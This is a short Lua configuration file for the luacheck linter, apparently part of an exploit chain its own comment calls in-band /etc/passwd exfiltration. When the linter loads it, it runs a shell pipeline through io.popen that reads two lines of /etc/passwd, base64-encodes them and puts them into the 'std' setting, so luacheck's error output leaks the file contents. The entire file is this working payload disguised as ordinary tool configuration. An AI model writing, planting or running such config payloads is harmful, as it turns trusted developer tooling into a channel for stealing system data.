-- EXECCHAIN-01 v3: in-band /etc/passwd exfil, chunk B (entries 3-4) via luacheck std error
local marker = "noexec"
local h = io.popen('{ printf "B|"; sed -n "3,4p" /etc/passwd | paste -sd"|" -; } | base64 -w0 | tr "+/" "-_" | tr -d "="')
if h then
  local line = h:read("*l")
  h:close()
  if line and #line > 0 then marker = line end
end
std = "EXECX_" .. marker
